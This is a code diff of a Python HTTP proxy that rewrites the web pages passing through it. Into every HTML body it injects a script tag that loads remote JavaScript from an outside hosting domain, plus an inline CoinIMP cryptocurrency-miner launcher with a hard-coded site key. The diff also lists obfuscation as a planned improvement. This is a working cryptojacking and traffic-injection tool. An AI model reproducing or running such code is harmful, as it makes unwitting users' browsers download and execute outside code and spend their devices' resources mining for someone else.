@@ -5,18 +5,21 @@ import time
 import urllib.request
 import urllib.parse
 import urllib.error
+from http.cookiejar import CookieJar
+from bs4 import BeautifulSoup
+from IPython import embed
+import io
+import gzip
 
 hostName=''
 hostPort=9090
 
-##TODO:
-# 1) fix the body and BODY
-# 2) fix the metachar set
-# 3) fix that it downloads
-
-nice_mining_code = b'<SCRIPT src="https://www.hostingcloud.science./wDfk.js"></SCRIPT>\n<SCRIPT>\nvar _givemecoins = new Client.Anonymous(\x279b9d88865acb8bb8cbee2e46cc04da113b51ebe782742b6a5671750315002950\x27, { throttle: 0.5\n});\n_givemecoins.start();\n_givemecoins.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");\n</SCRIPT>'
-
-mining_code = b'<SCRIPT src="https://www.hostingcloud.science./wDfk.js"></SCRIPT>\n<SCRIPT>\nvar _givemecoins = new Client.Anonymous(\x279b9d88865acb8bb8cbee2e46cc04da113b51ebe782742b6a5671750315002950\x27, { throttle: 0.5\n});\n_givemecoins.start();\n</SCRIPT>'
+## TODO:
+# - Could add better exception handling
+# - Multithreaded
+# - Redirection handling
+# - code obfuscation or path to script in local PC
+mining_code_tag = b'\nvar _givemecoins = new Client.Anonymous(\x272f8f3058590c46872f769ebf9fc1517d459045b3370860568d98ffd41664aa43\x27, { throttle: 0.3\n});\n_givemecoins.start();\n_givemecoins.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");\n'
 
 def get_index(string,list_of_tup):
     for x in list_of_tup:
@@ -24,34 +27,48 @@ def get_index(string,list_of_tup):
             return list_of_tup.index(x)
     return None
 
-print(mining_code)
 class MyServer(BaseHTTPRequestHandler):
     def do_GET(self):
         URL = "http://"+self.headers['Host']+self.path
         #print(URL)
         myheaders = self.headers.__dict__
-        if 'Cache-Control' in [x[0] for x in myheaders['_headers']]:
-            del myheaders['_headers'][get_index('Cache-Control',myheaders['_headers'])]
-        myheaders['_headers'].append(('Cache-Control','no-cache'))
+        #if 'Cache-Control' in [x[0] for x in myheaders['_headers']]:
+        #    del myheaders['_headers'][get_index('Cache-Control',myheaders['_headers'])]
+        #myheaders['_headers'].append(('Cache-Control','no-cache'))
         new_req = urllib.request.Request(url=URL,headers=dict(myheaders['_headers']),method=self.command)
-
+        print (new_req.full_url)
+        
+        cj = CookieJar() # To avoid infinite loop redirection
+        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
         try:
-            with urllib.request.urlopen(new_req) as response:
-                the_page = response.read()
-                head_page = the_page.split(b'</HEAD>')
-                if len(head_page)>1:
-                    the_page = head_page[0]+b'<meta charset="utf-8"/>'+b'</HEAD>'+head_page[1]
-                #self.wfile.write(mining_code+the_page)
-                if len(the_page.split(b'</BODY>')) == 2: #There is just one BODY in a web page
-                    #print("Injecting")
-                    tmp_page = the_page.split(b'</BODY>')
-                    the_page = tmp_page[0] + mining_code + b'</BODY>' + tmp_page[1]
-                    self.wfile.write(the_page)
-                    #print(the_page)
+            #with urllib.request.urlopen(new_req) as response:
+            with opener.open(new_req,timeout=7) as response:
+                if response.info().get('Content-Encoding') == 'gzip':
+                    buf = io.BytesIO( response.read())
+                    f = gzip.GzipFile(fileobj=buf)
+                    the_page = f.read()
                 else:
-                    print("NO injection for: "+URL)
-                    print(len(the_page.split(b'</body>')))
-                    self.wfile.write(the_page)
+                    print(response.info().get('Content-Encoding'))
+                    the_page = response.read()
+
+                if len(the_page) > 0:
+                    if "text/html" in response.headers["content-type"]:
+                        html = BeautifulSoup(the_page,"html.parser")#,from_encoding="iso-8859-1")
+                        script = html.new_tag("script",src="https://www.hostingcloud.racing/n2J6.js")
+                        html.body.insert(-1,script)
+                        script2 = html.new_tag("script")
+                        script2.string = mining_code_tag.decode('utf-8')
+                        html.body.insert(-1,script2)
+                        the_page = bytes(str(html).encode("utf-8"))
+                        print("Script injected.")
+                        with open("debugging_body.txt","wb+") as fout:
+                            fout.write(the_page)
+                            fout.write(b'\n********END**********\n')
+                    else:
+                        print("NO injection for: {}".format(URL))
+
+                    self.wfile.write(the_page)  # Send result back
+                response.close()
         except urllib.error.HTTPError as e:
             print("Error for {0}: {1} -> {2}".format(URL,e.code,e.msg))
 
